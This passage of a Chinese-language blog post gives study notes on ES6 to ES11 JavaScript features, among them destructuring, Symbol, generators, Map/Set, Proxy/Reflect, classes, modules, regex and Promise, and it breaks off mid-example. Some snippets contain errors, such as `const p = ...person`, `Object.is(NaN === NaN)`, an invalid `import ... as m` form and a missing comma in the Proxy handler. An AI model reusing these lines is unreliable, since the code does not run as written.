</ul>
<h2 id="ES-7"><a href="#ES-7" class="headerlink" title="ES 7"></a>ES 7</h2><ul>
<li>幂运算符（**）</li>
<li>数组扩展：Array.prototype.includes() 用来判断一个数组是否包含一个指定的值</li>
</ul>
<h2 id="ES-8"><a href="#ES-8" class="headerlink" title="ES 8"></a>ES 8</h2><ul>
<li>async &#x2F; await</li>
<li>字符串扩展</li>
<li>共享内存和Atomics：允许您在多个 workers 和主线程之间共享 SharedArrayBuffer 对象的字节</li>
<li>Object.values &#x2F; Object.entries</li>
<li>String padding</li>
<li>Object.getOwnPropertyDescriptors()</li>
<li>函数参数列表和调用中的尾逗号</li>
</ul>
<h2 id="ES-9"><a href="#ES-9" class="headerlink" title="ES 9"></a>ES 9</h2><ul>
<li>对象解构赋值</li>
<li>异步迭代</li>
<li>Rest&#x2F;Spread 属性</li>
<li>新的正则表达式功能</li>
<li>Promise.prototype.finally()</li>
<li>模板字符串修改</li>
</ul>
<h2 id="ES-10"><a href="#ES-10" class="headerlink" title="ES 10"></a>ES 10</h2><ul>
<li>扩展对象</li>
<li>数组方法</li>
<li>行分隔符（U + 2028）和段分隔符（U + 2029）符号现在允许在字符串文字中，与JSON匹配</li>
<li>更加友好的 JSON.stringify</li>
<li>新增了Array的flat()方法和flatMap()方法</li>
<li>新增了String的trimStart()方法和trimEnd()方法</li>
<li>Object.fromEntries()</li>
<li>Symbol.prototype.description</li>
<li>String.prototype.matchAll</li>
<li>Function.prototype.toString()现在返回精确字符，包括空格和注释</li>
<li>简化try {} catch {},修改 catch 绑定</li>
<li>新的基本数据类型BigInt</li>
<li>globalThis</li>
<li>import()</li>
<li>Legacy RegEx</li>
<li>私有的实例方法和访问器</li>
</ul>
<h1 id="Let"><a href="#Let" class="headerlink" title="Let"></a>Let</h1><p>一般<code> var</code> 没有块级作用域。</p>
<p>而<code>let</code>不可重复声明，支持块级作用域，且不存在变量提升。</p>
<h1 id="const"><a href="#const" class="headerlink" title="const"></a>const</h1><p>修改其元素和属性，不算对常量的修改。</p>
<h1 id="解构赋值"><a href="#解构赋值" class="headerlink" title="解构赋值"></a>解构赋值</h1><p>解构赋值是对赋值运算符的扩展。</p>
<p>例如：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> [a, b, c] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">let</span> [a, [[b], c]] = [<span class="number">1</span>, [[<span class="number">2</span>], <span class="number">3</span>]];</span><br><span class="line"><span class="keyword">let</span> [a, , b] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];  <span class="comment">// 忽略 2</span></span><br><span class="line"><span class="keyword">let</span> [a = <span class="number">1</span>, b] = [];       <span class="comment">// b undefined</span></span><br><span class="line"><span class="keyword">let</span> [a, ...b] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]; <span class="comment">// b [2, 3]</span></span><br><span class="line"><span class="keyword">let</span> [a, b, c, d, e] = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="keyword">let</span> &#123; foo, bar &#125; = &#123; <span class="attr">foo</span>: <span class="string">&#x27;aaa&#x27;</span>, <span class="attr">bar</span>: <span class="string">&#x27;bbb&#x27;</span> &#125;;</span><br></pre></td></tr></table></figure>

<h1 id="Symbol"><a href="#Symbol" class="headerlink" title="Symbol"></a>Symbol</h1><p>是一种新的数据类型，Symbol 表示独一无二的值，最大的用法是用来定义对象的唯一属性名。一个对象的键只能是字符串或Symbol。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> sy = <span class="title class_">Symbol</span>(<span class="string">&quot;key1&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> syObject = &#123;&#125;;</span><br><span class="line">syObject[sy] = <span class="string">&quot;kk&quot;</span>;  <span class="comment">// 只能是方括号形式，不可用点</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(syObject);</span><br></pre></td></tr></table></figure>

<p>不会出现在 for…in 、 for…of 的循环中，也不会被 Object.keys() 、 Object.getOwnPropertyNames() 返回。</p>
<p>如果要读取到一个对象的 Symbol 属性，可以通过 Object.getOwnPropertySymbols() 和 Reflect.ownKeys() 取到。</p>
<p>Symbol 也可以定义常量。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable constant_">COLOR_RED</span> = <span class="title class_">Symbol</span>(<span class="string">&quot;red&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">COLOR_YELLOW</span> = <span class="title class_">Symbol</span>(<span class="string">&quot;yellow&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">COLOR_BLUE</span> = <span class="title class_">Symbol</span>(<span class="string">&quot;blue&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>其他方法：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 搜索全局symbol</span></span><br><span class="line"><span class="title class_">Symbol</span>.<span class="title function_">for</span>()</span><br><span class="line"><span class="comment">// 返回一个已登记的symbol值的key</span></span><br><span class="line"><span class="title class_">Symbol</span>.<span class="title function_">keyFor</span>()</span><br></pre></td></tr></table></figure>

<h1 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h1><p>支持：</p>
<ul>
<li>Array</li>
<li>Arguments</li>
<li>Set</li>
<li>Map</li>
<li>String</li>
<li>TypedArray</li>
<li>NodeList</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> [key, val] <span class="keyword">of</span> map)&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>适用于自定义遍历数据。</p>
<h1 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h1><p>使用<code>yield</code>关键字实现的函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> * <span class="title function_">fn</span>(<span class="params">arg</span>) &#123;  <span class="comment">// 要有 * 号，表示是生成器</span></span><br><span class="line">    <span class="comment">// 接收到的参数 = 返回的值</span></span><br><span class="line">    <span class="keyword">let</span> param1 = <span class="keyword">yield</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="keyword">let</span> param2 = <span class="keyword">yield</span> <span class="string">&quot;2&quot;</span>;</span><br><span class="line">    <span class="keyword">let</span> param3 = <span class="keyword">yield</span> <span class="string">&quot;3&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> iterator = <span class="title function_">fn</span>();</span><br><span class="line">iterator.<span class="title function_">next</span>(param) <span class="comment">// 生成</span></span><br></pre></td></tr></table></figure>



<h1 id="Map-Set"><a href="#Map-Set" class="headerlink" title="Map Set"></a>Map Set</h1><p>Map 是键值对：</p>
<ul>
<li>键可以是任何值。</li>
<li>添加的键是有序的。</li>
<li>可以获取键值对数。</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line">map.<span class="title function_">set</span>(key, <span class="string">&quot;&quot;</span>)</span><br><span class="line">map.<span class="title function_">get</span>(key)</span><br></pre></td></tr></table></figure>

<p>遍历</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> [key, val] <span class="keyword">of</span> map)&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line">map.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">val, key</span>)&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;, map)</span><br></pre></td></tr></table></figure>

<p>Set 对象允许存储任何类型的唯一值，无论是原始值或者是对象引用。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> set = <span class="keyword">new</span> <span class="title class_">Set</span>();</span><br><span class="line"></span><br><span class="line">set.<span class="title function_">add</span>(<span class="number">1</span>)</span><br><span class="line"><span class="comment">// 交集</span></span><br><span class="line"><span class="keyword">var</span> ix = <span class="keyword">new</span> <span class="title class_">Set</span>([...a].<span class="title function_">filter</span>(<span class="function"><span class="params">x</span> =&gt;</span> b.<span class="title function_">has</span>(x)))</span><br><span class="line"><span class="comment">// 差集</span></span><br><span class="line"><span class="keyword">var</span> ix = <span class="keyword">new</span> <span class="title class_">Set</span>([...a].<span class="title function_">filter</span>(<span class="function"><span class="params">x</span> =&gt;</span> !b.<span class="title function_">has</span>(x)))</span><br></pre></td></tr></table></figure>

<h1 id="Reflect-Proxy"><a href="#Reflect-Proxy" class="headerlink" title="Reflect Proxy"></a>Reflect Proxy</h1><p>Proxy 可以对目标对象的读取、函数调用等操作进行拦截，然后进行操作处理。它不直接操作对象，而是像代理模式，通过对象的代理对象进行操作，在进行这些操作时，可以添加一些需要的额外操作。</p>
<p>一个 Proxy 对象由两个部分组成： target 、 handler 。在通过 Proxy 构造函数生成实例对象时，需要提供这两个参数。 target 即目标对象， handler 是一个对象，声明了代理 target 的指定行为。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> target = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;Tom&#x27;</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="number">24</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> handler = &#123;</span><br><span class="line">    <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params">target, key</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;getting &#x27;</span>+key);</span><br><span class="line">        <span class="keyword">return</span> target[key]; <span class="comment">// 不是target.key</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">set</span>: <span class="keyword">function</span>(<span class="params">target, key, value</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;setting &#x27;</span>+key);</span><br><span class="line">        target[key] = value;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 用于拦截函数的调用、call 和 reply 操作。</span></span><br><span class="line">    <span class="comment">// target 表示目标对象，ctx 表示目标对象上下文，args 表示目标对象的参数数组。</span></span><br><span class="line">    <span class="attr">apply</span>: <span class="keyword">function</span>(<span class="params">target, ctx, args</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;handle apply&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Reflect</span>.<span class="title function_">apply</span>(...<span class="variable language_">arguments</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 用于拦截 HasProperty 操作，即在判断 target 对象是否存在 propKey 属性时，会被这个方法拦截。此方法不判断一个属性是对象自身的属性，还是继承的属性。此方法不拦截 for ... in 循环。</span></span><br><span class="line">    <span class="attr">has</span>: <span class="keyword">function</span>(<span class="params">target, propKey</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;handle has&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> propKey <span class="keyword">in</span> target;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 用于拦截 new 命令。返回值必须为对象。</span></span><br><span class="line">    <span class="attr">construct</span>: <span class="keyword">function</span> (<span class="params">target, args, newTarget</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;handle construct&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Reflect</span>.<span class="title function_">construct</span>(target, args, newTarget)  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 用于拦截 delete 操作，如果这个方法抛出错误或者返回 false ，propKey 属性就无法被 delete 命令删除。</span></span><br><span class="line">    <span class="attr">deleteProperty</span>: <span class="literal">null</span>,</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> proxy = <span class="keyword">new</span> <span class="title class_">Proxy</span>(target, handler)</span><br><span class="line">proxy.<span class="property">name</span>     <span class="comment">// 实际执行 handler.get</span></span><br><span class="line">proxy.<span class="property">age</span> = <span class="number">25</span> <span class="comment">// 实际执行 handler.set</span></span><br></pre></td></tr></table></figure>

<p><a href="https://www.runoob.com/w3cnote/es6-reflect-proxy.html">其他操作</a></p>
<p>ES6 中将 Object 的一些明显属于语言内部的方法移植到了 Reflect 对象上（当前某些方法会同时存在于 Object 和 Reflect 对象上），未来的新方法会只部署在 Reflect 对象上。</p>
<p>Reflect 对象对某些方法的返回结果进行了修改，使其更合理。</p>
<p>Reflect 对象使用函数的方式实现了 Object 的命令式操作。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> exam = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;Tom&quot;</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="number">24</span>,</span><br><span class="line">    <span class="keyword">get</span> <span class="title function_">info</span>()&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">name</span> + <span class="variable language_">this</span>.<span class="property">age</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 当 target 对象中存在 name 属性的 getter 方法， getter 方法的 this 会绑定 receiver</span></span><br><span class="line"><span class="keyword">let</span> receiver = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;Jerry&quot;</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="number">20</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Reflect</span>.<span class="title function_">get</span>(exam, <span class="string">&#x27;info&#x27;</span>, receiver); <span class="comment">// Jerry20</span></span><br><span class="line"><span class="title class_">Reflect</span>.<span class="title function_">set</span>(target, name, value, receiver)</span><br><span class="line"><span class="title class_">Reflect</span>.<span class="title function_">has</span>(obj, name)</span><br><span class="line"><span class="title class_">Reflect</span>.<span class="title function_">deleteProperty</span>(obj, property)</span><br><span class="line"><span class="title class_">Reflect</span>.<span class="title function_">construct</span>(obj, args)</span><br></pre></td></tr></table></figure>

<p>实现观察者模式：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义 Set 集合</span></span><br><span class="line"><span class="keyword">const</span> queuedObservers = <span class="keyword">new</span> <span class="title class_">Set</span>();</span><br><span class="line"><span class="comment">// 把观察者函数都放入 Set 集合中</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">observe</span> = fn =&gt; queuedObservers.<span class="title function_">add</span>(fn);</span><br><span class="line"><span class="comment">// observable 返回原始对象的代理，拦截赋值操作</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">observable</span> = obj =&gt; <span class="keyword">new</span> <span class="title class_">Proxy</span>(obj, &#123;set&#125;);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">set</span>(<span class="params">target, key, value, receiver</span>) &#123;</span><br><span class="line">  <span class="comment">// 获取对象的赋值操作</span></span><br><span class="line">  <span class="keyword">const</span> result = <span class="title class_">Reflect</span>.<span class="title function_">set</span>(target, key, value, receiver);</span><br><span class="line">  <span class="comment">// 执行所有观察者</span></span><br><span class="line">  queuedObservers.<span class="title function_">forEach</span>(<span class="function"><span class="params">observer</span> =&gt;</span> <span class="title function_">observer</span>());</span><br><span class="line">  <span class="comment">// 执行赋值操作</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><p>新加入反引号用法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> str = <span class="string">`</span></span><br><span class="line"><span class="string">&lt;ul&gt;</span></span><br><span class="line"><span class="string">  &lt;li&gt;a&lt;/li&gt;</span></span><br><span class="line"><span class="string">  &lt;li&gt;<span class="subst">$&#123;user&#125;</span>&lt;/li&gt;</span></span><br><span class="line"><span class="string">&lt;/ul&gt;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 清除空格</span></span><br><span class="line">str.<span class="title function_">trimStart</span>()</span><br><span class="line">str.<span class="title function_">trimEnd</span>()</span><br></pre></td></tr></table></figure>

<h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><p>常用方法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [<span class="string">&#x27;aa&#x27;</span>, <span class="string">&#x27;bb&#x27;</span>, <span class="string">&#x27;cc&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> (arr.<span class="title function_">includes</span>(<span class="string">&#x27;bb&#x27;</span>)) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 扁平化数组</span></span><br><span class="line">arr.<span class="title function_">flat</span>(<span class="number">2</span>) <span class="comment">// 参数为深度</span></span><br><span class="line">arr.<span class="title function_">flatMap</span>()</span><br></pre></td></tr></table></figure>



<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><p>箭头函数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">fn</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>默认参数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">add</span> (a, b, c=<span class="number">10</span>) &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>rest 参数，用于代替arguments</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">arguments</span>); <span class="comment">// 对象</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params">...args</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(args); <span class="comment">// 数组</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可选链操作符</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> name = person.<span class="property">stu</span>.<span class="property">name</span> <span class="comment">// 如果stu 是undefined，那么会报错</span></span><br><span class="line"><span class="keyword">const</span> name = person?.<span class="property">stu</span>?.<span class="property">name</span> <span class="comment">// 不会报错，得到undefined</span></span><br></pre></td></tr></table></figure>



<h1 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h1><p>允许直接插入变量</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> person = &#123;</span><br><span class="line">    name,  <span class="comment">// ES6</span></span><br><span class="line">    <span class="attr">age</span>: <span class="number">10</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解对象操作</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> p = ...person</span><br></pre></td></tr></table></figure>

<p>方法扩展</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 判断是否相等</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">is</span>(<span class="title class_">NaN</span> === <span class="title class_">NaN</span>)</span><br><span class="line"><span class="comment">// 对象合并</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">assign</span>(obj1, obj2)</span><br><span class="line"><span class="comment">// 设置为属性</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">setPrototypeOf</span>(obj1, obj2)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取键、值、键值对</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">keys</span>(stu)</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">values</span>(stu)</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">entries</span>(stu)  <span class="comment">// 得到 二维数组</span></span><br><span class="line"><span class="comment">// 创建对象</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>, &#123;</span><br><span class="line">    <span class="attr">name</span>: &#123;</span><br><span class="line">        <span class="attr">value</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="attr">writable</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">configurable</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">enumerable</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 获取描述对象，上面的那个，用于对象克隆</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">getOwnPropertyDescriptors</span>(stu)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建新对象，与entries互为逆运算</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">fromEntries</span>([</span><br><span class="line">    [<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;123&#x27;</span>],</span><br><span class="line">    [<span class="string">&#x27;age&#x27;</span>, <span class="number">123</span>]</span><br><span class="line">])</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">fromEntries</span>(<span class="keyword">new</span> <span class="title class_">Map</span>())</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ES 11 的私有属性</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="comment">// # 开头的属性是私有的</span></span><br><span class="line">    #age</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>全局this</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">globalThis</span><br></pre></td></tr></table></figure>





<h1 id="类"><a href="#类" class="headerlink" title="类"></a>类</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> count = <span class="number">10</span>;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name, age</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">name</span> = name</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">age</span> = age</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">call</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">name</span></span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">get</span> <span class="title function_">height</span>() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;10m&#x27;</span></span><br><span class="line">        <span class="comment">// person.height 被读取</span></span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">set</span> <span class="title function_">height</span>(<span class="params">val</span>) &#123;</span><br><span class="line">        <span class="comment">// person.height 被修改</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Person</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name, age</span>) &#123;</span><br><span class="line">        <span class="variable language_">super</span>(name, age)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> stu = <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&#x27;jack&#x27;</span>, <span class="number">10</span>)</span><br></pre></td></tr></table></figure>





<h1 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h1><p>当需要暴露数据时，只需要在前面写<code>export</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> str = <span class="string">&#x27;123&#x27;</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> &#123;</span><br><span class="line">	str,</span><br><span class="line">    test</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    <span class="attr">custom</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当引入时</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;module&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">import</span> * <span class="keyword">as</span> m <span class="keyword">from</span> <span class="string">&#x27;./src/js/m.js&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">import</span> &#123; str &#125; <span class="keyword">as</span> m <span class="keyword">from</span> <span class="string">&#x27;./src/js/m.js&#x27;</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>动态引入</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span>() <span class="comment">// 得到 promise 对象</span></span><br></pre></td></tr></table></figure>



<h1 id="正则"><a href="#正则" class="headerlink" title="正则"></a>正则</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> str = <span class="string">&#x27;&lt;a href=&quot;www.baidu.com&quot;&gt;baidu&lt;/a&gt;&#x27;</span></span><br><span class="line"><span class="comment">// 创建正则表达式，包含两个捕获分组</span></span><br><span class="line"><span class="keyword">const</span> reg = <span class="regexp">/&lt;a href=&quot;(.*)&quot;&gt;(.*)&lt;\/a&gt;/</span></span><br><span class="line"><span class="comment">// 执行</span></span><br><span class="line"><span class="keyword">const</span> result = reg.<span class="title function_">exec</span>(str)</span><br><span class="line"><span class="comment">// result 为一个数组</span></span><br><span class="line"><span class="comment">// 0 - str</span></span><br><span class="line"><span class="comment">// 1 - 第一个捕获</span></span><br><span class="line"><span class="comment">// 2 - 第二个捕获</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 还可以为分组命名</span></span><br><span class="line"><span class="keyword">const</span> reg = <span class="regexp">/&lt;a href=&quot;(?&lt;url&gt;.*)&quot;&gt;(?&lt;text&gt;.*)&lt;\/a&gt;/</span></span><br><span class="line"><span class="keyword">const</span> result = reg.<span class="title function_">exec</span>(str)</span><br><span class="line"><span class="keyword">const</span> text = result.<span class="property">groups</span>.<span class="property">text</span></span><br><span class="line"><span class="keyword">const</span> url = result.<span class="property">groups</span>.<span class="property">url</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 反向断言</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// dotAll 模式 正则串末尾加 s</span></span><br><span class="line"><span class="comment">// 此时 . 表示任意字符，包括换行符</span></span><br><span class="line"><span class="keyword">const</span> reg = <span class="regexp">/&lt;a href=&quot;(?&lt;url&gt;.*)&quot;&gt;(?&lt;text&gt;.*)&lt;\/a&gt;/</span>s</span><br><span class="line"></span><br><span class="line"><span class="comment">// matchAll 末尾加 g</span></span><br><span class="line"><span class="comment">// 得到可迭代对象</span></span><br></pre></td></tr></table></figure>




<h1 id="异步对象"><a href="#异步对象" class="headerlink" title="异步对象"></a>异步对象</h1><h2 id="Promise"><a href="#Promise" class="headerlink" title="Promise"></a>Promise</h2><p>Promise 对象代表了未来将要发生的事件，用来传递异步操作的消息。</p>
<p>有了 Promise 对象，就可以将异步操作以同步操作的流程表达出来，避免了层层嵌套的回调函数。此外，Promise 对象提供统一的接口，使得控制异步操作更加容易。</p>
<p>Promise 也有一些缺点。首先，无法取消 Promise，一旦新建它就会立即执行，无法中途取消。其次，如果不设置回调函数，Promise 内部抛出的错误，不会反应到外部。第三，当处于 Pending 状态时，无法得知目前进展到哪一个阶段（刚刚开始还是即将完成）。</p>
<p>创建：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> promise = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="keyword">function</span>(<span class="params">resolve, reject</span>) &#123;</span><br><span class="line">    <span class="comment">// 异步处理</span></span><br><span class="line">    <span class="comment">// 处理结束后、调用resolve 或 reject</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对于已经实例化过的 promise 对象可以调用 promise.then() 方法，传递 resolve 和 reject 方法作为回调。</span></span><br><span class="line">promise.<span class="title function_">then</span>(onFulfilled, onRejected)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或</span></span><br><span class="line">promise.<span class="title function_">then</span>(onFulfilled).<span class="title function_">catch</span>(onRejected)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 链式操作</span></span><br><span class="line"><span class="comment">// 第一个回调函数完成以后，会将返回结果作为参数，传入第二个回调函数。</span></span><br><span class="line"><span class="title function_">getJSON</span>(<span class="string">&quot;/posts.json&quot;</span>).<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params">json</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> json.<span class="property">post</span>;</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params">post</span>) &#123;</span><br><span class="line">  <span class="comment">// proceed</span></span><br><span 